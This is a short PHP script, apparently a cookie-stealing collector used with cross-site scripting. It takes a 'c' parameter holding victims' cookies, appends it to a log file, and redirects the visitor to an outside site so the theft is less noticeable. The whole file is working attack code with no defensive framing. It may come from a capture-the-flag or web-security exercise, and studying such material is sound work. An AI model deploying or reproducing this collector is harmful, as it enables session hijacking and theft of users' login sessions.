<?php
header ('Location:https://zephyr.bitskrieg.com/web1');
	$cookies = $_GET["c"];
	$file = fopen('log.txt', 'a');
	fwrite($file, $cookies . "\n\n");

?>
